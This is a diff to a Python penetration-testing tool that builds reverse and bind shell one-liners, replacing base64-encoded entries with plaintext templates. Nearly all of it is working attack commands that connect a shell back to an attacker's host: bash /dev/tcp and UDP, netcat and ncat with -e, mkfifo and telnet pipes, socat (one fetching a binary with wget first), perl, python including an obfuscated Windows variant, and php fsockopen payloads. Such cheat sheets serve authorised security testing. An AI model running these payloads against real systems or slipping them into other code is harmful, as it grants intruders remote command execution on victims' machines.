@@ -2,12 +2,13 @@
 # Author: Charlie BROMBERG (Shutdown - @_nwodtuhs)
 
 '''
- Heavily inspired by : https://github.com/sameera-madushan/Print-My-Shell
+Inspired by : https://github.com/sameera-madushan/Print-My-Shell
 Reverse shells found on :
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 - https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/
 - https://ashr.net/bind/and/reverse/shell/cheatsheet/windows/and/linux.aspx
+- https://krober.biz/misc/reverse_shell.php
 '''
 
 import argparse
@@ -57,118 +58,115 @@ def get_options():
         options.TYPE = list(shells_dict.keys())[selection]
     return options
 
-# Helper function for populate populate_shells to add values to the dictionnary
-def add_shell(dictionnary, key, value):
-    if not key in dictionnary.keys():
-        values = [value]
-        dictionnary.update({key:values})
+# Helper function for populate_shells to add values to the dictionnaries
+def add_shell(shells_dict, type, shell, notes=None):
+    if not type in shells_dict.keys():
+        shells = []
     else:
-        values = []
-        for element in dictionnary[key]:
-            values.append(element)
-        values.append(value)
-        dictionnary.update({key:values})
-
-# Decode from base64 and format with IP and PORT
-def gen_shell():
-    shell = base64.b64decode(encoded_shell).decode('utf-8')
-    if options.SHELLTYPE == 'revshells':
-        return shell.replace('{0}', options.LHOST).replace('{1}', options.LPORT).strip()
-    elif options.SHELLTYPE == 'bindshells':
-        return shell.replace('{0}', options.LPORT).strip()
-
-# Search for notes in shells in the format <note>Some kinf of note</note>
-def search_notes():
-    notes = ''
-    if '<note>' in shell:
-        for match in re.findall('<note>(.+?)</note>', shell):
-            notes += Fore.BLUE + Style.BRIGHT + match + Style.RESET_ALL + ' '
-    return notes
+        shells = shells_dict[type]
+    shells.append((notes, shell))
+    shells_dict.update({type:shells})
 
 # Add shells to the main dictionnaries: revshells and bindshells
 def populate_shells():
-    '''
-    Shells dictionnary population
-    Shells must be encoded in base64 in order to manage more easily special characters
-    You can add notes to each shell in the format <note>Whatever you want</note>. These notes will be printed in blue.
-    Base64 encoded shells with notes start with: PG5vdGU
-    '''
-    # bash -i >& /dev/tcp/{0}/{1} 0>&1
-    add_shell(revshells, 'bash', 'YmFzaCAtaSA+JiAvZGV2L3RjcC97MH0vezF9IDA+JjE=')
-    # 0<&196;exec 196<>/dev/tcp/{0}/{1}; sh <&196 >&196 2>&196
-    add_shell(revshells, 'bash', 'MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC97MH0vezF9OyBzaCA8JjE5NiA+JjE5NiAyPiYxOTY=')
-    #exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do $line 2>&5 >&5; done
-    add_shell(revshells, 'bash', 'ZXhlYyA1PD4vZGV2L3RjcC97MH0vezF9O2NhdCA8JjUgfCB3aGlsZSByZWFkIGxpbmU7IGRvICRsaW5lIDI+JjUgPiY1OyBkb25l')
-    #exec /bin/sh 0</dev/tcp/{0}/{1} 1>&0 2>&0  [+++]
-    add_shell(revshells, 'bash', 'ZXhlYyAvYmluL3NoIDA8L2Rldi90Y3AvezB9L3sxfSAxPiYwIDI+JjA=')
-    #echo 'set s [socket {0} {1}];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
-    add_shell(revshells, 'tcl', 'ZWNobyAnc2V0IHMgW3NvY2tldCB7MH0gezF9XTt3aGlsZSA0MiB7IHB1dHMgLW5vbmV3bGluZSAkcyAic2hlbGw+IjtmbHVzaCAkcztnZXRzICRzIGM7c2V0IGUgImV4ZWMgJGMiO2lmIHshW2NhdGNoIHtzZXQgciBbZXZhbCAkZV19IGVycl19IHsgcHV0cyAkcyAkciB9OyBmbHVzaCAkczsgfTsgY2xvc2UgJHM7JyB8IHRjbHNo')
-    # nc -e /bin/sh {0} {1}
-    add_shell(revshells, 'netcat', 'bmMgLWUgL2Jpbi9zaCB7MH0gezF9')
-    # nc -e /bin/bash {0} {1}
-    add_shell(revshells, 'netcat', 'bmMgLWUgL2Jpbi9iYXNoIHswfSB7MX0=')
-    # nc -c bash {0} {1}
-    add_shell(revshells, 'netcat', 'bmMgLWMgYmFzaCB7MH0gezF9')
-    # rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f
-    add_shell(revshells, 'netcat', 'PG5vdGU+T3BlbkJTRDwvbm90ZT5ybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjEwLjEwIDEzMzcgPi90bXAvZgo=')
-    # ncat {0} {1} -e /bin/bash
-    add_shell(revshells, 'netcat', 'bmNhdCB7MH0gezF9IC1lIC9iaW4vYmFzaA==')
-    # ncat --udp {0} {1} -e /bin/bash
-    add_shell(revshells, 'netcat', 'bmNhdCAtLXVkcCB7MH0gezF9IC1lIC9iaW4vYmFzaA==')
-    # rm -f /tmp/p; mknod /tmp/p p && telnet {0} {1} 0/tmp/p
-    add_shell(revshells, 'telnet', 'cm0gLWYgL3RtcC9wOyBta25vZCAvdG1wL3AgcCAmJiB0ZWxuZXQgezB9IHsxfSAwL3RtcC9w')
-    #rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet {0} {1} > f
-    add_shell(revshells, 'telnet', 'cm0gZjtta2ZpZm8gZjtjYXQgZnwvYmluL3NoIC1pIDI+JjF8dGVsbmV0IHswfSB7MX0gPiBm')
-    # telnet {0} {1} | /bin/bash | telnet {0} {1}
-    add_shell(revshells, 'telnet', 'dGVsbmV0IHswfSB7MX0gfCAvYmluL2Jhc2ggfCB0ZWxuZXQgezB9IHsxfQ==')
-    # python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-    add_shell(revshells, 'python', 'cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiezB9Iix7MX0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc=')
-    # powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{0}",{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-    add_shell(revshells, 'powershell', 'cG93ZXJzaGVsbCAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3MgLUNvbW1hbmQgTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCJ7MH0iLHsxfSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2syICA9ICRzZW5kYmFjayArICJQUyAiICsgKHB3ZCkuUGF0aCArICI+ICI7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCkK')
-    # powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{0}',{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-    add_shell(revshells, 'powershell', 'cG93ZXJzaGVsbCAtbm9wIC1jICIkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCd7MH0nLHsxfSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2syID0gJHNlbmRiYWNrICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJzskc2VuZGJ5dGUgPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJHNlbmRiYWNrMik7JHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTskc3RyZWFtLkZsdXNoKCl9OyRjbGllbnQuQ2xvc2UoKSIK')
-    # socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{0}:{1}
-    add_shell(revshells, 'socat', 'c29jYXQgZXhlYzonYmFzaCAtbGknLHB0eSxzdGRlcnIsc2V0c2lkLHNpZ2ludCxzYW5lIHRjcDp7MH06ezF9')
-    # socat tcp-connect:{}:{} system:/bin/sh
-    add_shell(revshells, 'socat', 'c29jYXQgdGNwLWNvbm5lY3Q6e306e30gc3lzdGVtOi9iaW4vc2g=')
-    # perl -e 'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-    add_shell(revshells, 'perl', 'cGVybCAtZSAndXNlIFNvY2tldDskaT0iezB9IjskcD17MX07c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307Jwo=')
-    # perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{0}:{1}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
-    add_shell(revshells, 'perl', 'cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApOyRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCJ7MH06ezF9Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0+ZmRvcGVuKCRjLHcpO3N5c3RlbSRfIHdoaWxlPD47Jw==')
-    # perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{0}:{1}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
-    add_shell(revshells, 'perl', 'PG5vdGU+V2luZG93czwvbm90ZT5wZXJsIC1NSU8gLWUgJyRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxOTIuMTY4LjEwLjEwOjEzMzciKTtTVERJTi0+ZmRvcGVuKCRjLHIpOyR+LT5mZG9wZW4oJGMsdyk7c3lzdGVtJF8gd2hpbGU8PjsnCg==')
-    # ruby -rsocket -e'f=TCPSocket.open("{0}",{1}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-    add_shell(revshells, 'ruby', 'cnVieSAtcnNvY2tldCAtZSdmPVRDUFNvY2tldC5vcGVuKCJ7MH0iLHsxfSkudG9faTtleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgPCYlZCA+JiVkIDI+JiVkIixmLGYsZikn')
-    # ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{0}","{1}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
-    add_shell(revshells, 'ruby', 'cnVieSAtcnNvY2tldCAtZSAnZXhpdCBpZiBmb3JrO2M9VENQU29ja2V0Lm5ldygiezB9IiwiezF9Iik7d2hpbGUoY21kPWMuZ2V0cyk7SU8ucG9wZW4oY21kLCJyIil7fGlvfGMucHJpbnQgaW8ucmVhZH1lbmQnCg==')
-    # ruby -rsocket -e 'c=TCPSocket.new("{0}","{1}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
-    add_shell(revshells, 'ruby', 'PG5vdGU+V2luZG93czwvbm90ZT5ydWJ5IC1yc29ja2V0IC1lICdjPVRDUFNvY2tldC5uZXcoIjE5Mi4xNjguMTAuMTAiLCIxMzM3Iik7d2hpbGUoY21kPWMuZ2V0cyk7SU8ucG9wZW4oY21kLCJyIil7fGlvfGMucHJpbnQgaW8ucmVhZH1lbmQnCg==')
-    # echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{0}:{1}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
-    add_shell(revshells, 'golang', 'ZWNobyAncGFja2FnZSBtYWluO2ltcG9ydCJvcy9leGVjIjtpbXBvcnQibmV0IjtmdW5jIG1haW4oKXtjLF86PW5ldC5EaWFsKCJ0Y3AiLCJ7MH06ezF9Iik7Y21kOj1leGVjLkNvbW1hbmQoIi9iaW4vc2giKTtjbWQuU3RkaW49YztjbWQuU3Rkb3V0PWM7Y21kLlN0ZGVycj1jO2NtZC5SdW4oKX0nID4gL3RtcC90LmdvICYmIGdvIHJ1biAvdG1wL3QuZ28gJiYgcm0gL3RtcC90LmdvCg==')
-    # awk 'BEGIN {s = "/inet/tcp/0/{0}/{1}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
-    add_shell(revshells, 'awk', 'YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC97MH0vezF9Ijsgd2hpbGUoNDIpIHsgZG97IHByaW50ZiAic2hlbGw+IiB8JiBzOyBzIHwmIGdldGxpbmUgYzsgaWYoYyl7IHdoaWxlICgoYyB8JiBnZXRsaW5lKSA+IDApIHByaW50ICQwIHwmIHM7IGNsb3NlKGMpOyB9IH0gd2hpbGUoYyAhPSAiZXhpdCIpIGNsb3NlKHMpOyB9fScgL2Rldi9udWxsCg==')
-    # lua -e "require('socket');require('os');t=socket.tcp();t:connect('{0}','{1}');os.execute('/bin/sh -i <&3 >&3 2>&3');"
-    add_shell(revshells, 'lua', 'PG5vdGU+TGludXg8L25vdGU+bHVhIC1lICJyZXF1aXJlKCdzb2NrZXQnKTtyZXF1aXJlKCdvcycpO3Q9c29ja2V0LnRjcCgpO3Q6Y29ubmVjdCgnMTkyLjE2OC4xMC4xMCcsJzEzMzcnKTtvcy5leGVjdXRlKCcvYmluL3NoIC1pIDwmMyA+JjMgMj4mMycpOyIK')
-    # lua5.1 -e 'local host, port = "{0}", {1} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
-    add_shell(revshells, 'lua', 'bHVhNS4xIC1lICdsb2NhbCBob3N0LCBwb3J0ID0gInswfSIsIHsxfSBsb2NhbCBzb2NrZXQgPSByZXF1aXJlKCJzb2NrZXQiKSBsb2NhbCB0Y3AgPSBzb2NrZXQudGNwKCkgbG9jYWwgaW8gPSByZXF1aXJlKCJpbyIpIHRjcDpjb25uZWN0KGhvc3QsIHBvcnQpOyB3aGlsZSB0cnVlIGRvIGxvY2FsIGNtZCwgc3RhdHVzLCBwYXJ0aWFsID0gdGNwOnJlY2VpdmUoKSBsb2NhbCBmID0gaW8ucG9wZW4oY21kLCAiciIpIGxvY2FsIHMgPSBmOnJlYWQoIiphIikgZjpjbG9zZSgpIHRjcDpzZW5kKHMpIGlmIHN0YXR1cyA9PSAiY2xvc2VkIiB0aGVuIGJyZWFrIGVuZCBlbmQgdGNwOmNsb3NlKCkn')
-    # r = Runtime.getRuntime();p = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor();
-    add_shell(revshells, 'java', 'ciA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpO3AgPSByLmV4ZWMoWyIvYmluL3NoIiwiLWMiLCJleGVjIDU8Pi9kZXYvdGNwL3swfS97MX07Y2F0IDwmNSB8IHdoaWxlIHJlYWQgbGluZTsgZG8gXCRsaW5lIDI+JjUgPiY1OyBkb25lIl0gYXMgU3RyaW5nW10pO3Aud2FpdEZvcigpOw==')
-    # (function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect({1},"{0}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();
-    add_shell(revshells, 'nodejs', 'KGZ1bmN0aW9uKCl7dmFyIG5ldD1yZXF1aXJlKCJuZXQiKSxjcD1yZXF1aXJlKCJjaGlsZF9wcm9jZXNzIiksc2g9Y3Auc3Bhd24oIi9iaW4vc2giLFtdKTt2YXIgY2xpZW50PW5ldyBuZXQuU29ja2V0KCk7Y2xpZW50LmNvbm5lY3QoezF9LCJ7MH0iLGZ1bmN0aW9uKCl7Y2xpZW50LnBpcGUoc2guc3RkaW4pO3NoLnN0ZG91dC5waXBlKGNsaWVudCk7c2guc3RkZXJyLnBpcGUoY2xpZW50KTt9KTtyZXR1cm4gL2EvO30pKCk7Cg==')
-    #php -r '$sock=fsockopen({0},{1});exec('/bin/sh -i <&3 >&3 2>&3');'
-    add_shell(revshells, 'php', 'cGhwIC1yICckc29jaz1mc29ja29wZW4oezB9LHsxfSk7ZXhlYygnL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMnKTsn')
-    #php -r '$sock=fsockopen({0},{1});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
-    add_shell(revshells, 'php', 'cGhwIC1yICckc29jaz1mc29ja29wZW4oezB9LHsxfSk7JHByb2M9cHJvY19vcGVuKCIvYmluL3NoIC1pIiwgYXJyYXkoMD0+JHNvY2ssIDE9PiRzb2NrLCAyPT4kc29jayksJHBpcGVzKTsn')
-    #php -r '$s=fsockopen("{0}",{1});popen("/bin/sh -i <&3 >&3 2>&3", "r");'
-    add_shell(revshells, 'php', 'cGhwIC1yICckcz1mc29ja29wZW4oInswfSIsezF9KTtwb3BlbigiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiLCAiciIpOyc=')
-    #php -r '$s=fsockopen({0},{1});system("/bin/sh -i <&3 >&3 2>&3");'
-    add_shell(revshells, 'php', 'cGhwIC1yICckcz1mc29ja29wZW4oezB9LHsxfSk7c3lzdGVtKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc=')
-    #php -r '$s=fsockopen("{0}",{1});shell_exec("/bin/sh -i <&3 >&3 2>&3");'
-    add_shell(revshells, 'php', 'cGhwIC1yICckcz1mc29ja29wZW4oInswfSIsezF9KTtzaGVsbF9leGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc=')
-    #php -r '$s=fsockopen("{0}",{1});`/bin/sh -i <&3 >&3 2>&3`;'
-    add_shell(revshells, 'php', 'cGhwIC1yICckcz1mc29ja29wZW4oInswfSIsezF9KTtgL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjNgOyc=')
-    # Bind shells dictionnary population
-    add_shell(bindshells, 'netcat', 'bmMgLWx2cCB7MH0gLWUgL2Jpbi9zaA==')
+    add_shell(revshells, 'bash', '''bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1''')
+    add_shell(revshells, 'bash', '''/bin/bash -c '/bin/bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' ''')
+    add_shell(revshells, 'bash', '''/bin/bash -i > /dev/tcp/{LHOST}/{LPORT} 0<& 2>&1''')
+    add_shell(revshells, 'bash', '''/bin/bash -c '/bin/bash -i > /dev/tcp/{LHOST}/{LPORT} 0<&1 2>&1' ''')
+    add_shell(revshells, 'bash', '''exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done''')
+    add_shell(revshells, 'bash', '''exec /bin/sh 0</dev/tcp/{LHOST}/{LPORT} 1>&0 2>&0''')
+    add_shell(revshells, 'bash', '''0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196''')
+    add_shell(shells_dict=revshells, type='bash', notes='UDP', shell='''bash -i >& /dev/udp/{LHOST}/{LPORT} 0>&1''')
+    add_shell(shells_dict=revshells, type='bash', notes='UDP Listener (attacker)', shell='''nc -u -lvp {LPORT}''')
+    add_shell(revshells, 'netcat', '''nc -e /bin/sh {LHOST} {LPORT}''')
+    add_shell(revshells, 'netcat', '''nc -e /bin/bash {LHOST} {LPORT}''')
+    add_shell(revshells, 'netcat', '''nc -c bash {LHOST} {LPORT}''')
+    add_shell(revshells, 'netcat', '''mknod backpipe p && nc {LHOST} {LPORT} 0<backpipe | /bin/bash 1>backpipe ''')
+    add_shell(revshells, 'netcat', '''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f''')
+    add_shell(revshells, 'netcat', '''rm -f /tmp/p; mknod /tmp/p p && nc {LHOST} {LPORT} 0/tmp/p 2>&1''')
+    add_shell(revshells, 'netcat', '''rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} > f''')
+    add_shell(revshells, 'netcat', '''rm -f x; mknod x p && nc {LHOST} {LPORT} 0<x | /bin/bash 1>x''')
+    add_shell(revshells, 'ncat', '''ncat {LHOST} {LPORT} -e /bin/bash''')
+    add_shell(revshells, 'ncat', '''ncat --udp {LHOST} {LPORT} -e /bin/bash''')
+    add_shell(revshells, 'telnet', '''rm -f /tmp/p; mknod /tmp/p p && telnet {LHOST} {LPORT} 0/tmp/p 2>&1''')
+    add_shell(revshells, 'telnet', '''telnet {LHOST} {LPORT} | /bin/bash | telnet {LHOST} 667''')
+    add_shell(revshells, 'telnet', '''rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet {LHOST} {LPORT} > f''')
+    add_shell(revshells, 'telnet', '''rm -f x; mknod x p && telnet {LHOST} {LPORT} 0<x | /bin/bash 1>x''')
+    add_shell(revshells, 'socat', '''/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}''')
+    add_shell(revshells, 'socat', '''socat tcp-connect:{LHOST}:{LPORT} exec:"bash -li",pty,stderr,setsid,sigint,sane''')
+    add_shell(revshells, 'socat', '''wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}''')
+    add_shell(shells_dict=revshells, type='socat', notes='Listener (attacker)', shell='''socat file:`tty`,raw,echo=0 TCP-L:{LPORT}''')
+    add_shell(revshells, 'perl', '''perl -e 'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' ''')
+    add_shell(revshells, 'perl', '''perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{LHOST}:{LPORT}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' ''')
+    add_shell(shells_dict=revshells, type='perl', notes='Windows', shell='''perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{LHOST}:{LPORT}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' ''')
+    add_shell(revshells, 'python', '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ''')
+    add_shell(revshells, 'python', '''export RHOST="{LHOST}";export RPORT={LPORT};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' ''')
+    add_shell(revshells, 'python', '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' ''')
+    add_shell(shells_dict=revshells, type='python', notes='Windows', shell='''C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('{LHOST}', {LPORT})), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"''')
+    add_shell(revshells, 'php', '''php -r '$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");' ''')
+    add_shell(revshells, 'php', '''php -r '$s=fsockopen("{LHOST}",{LPORT});$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);' ''')
+    add_shell(revshells, 'php', '''php -r '$s=fsockopen("{LHOST}",{LPORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");' ''')
+    add_shell(revshells, 'php', '''php -r '$s=fsockopen("{LHOST}",{LPORT});`/bin/sh -i <&3 >&3 2>&3`;' ''')
+    add_shell(revshells, 'php', '''php -r '$s=fsockopen("{LHOST}",{LPORT});system("/bin/sh -i <&3 >&3 2>&3");' ''')
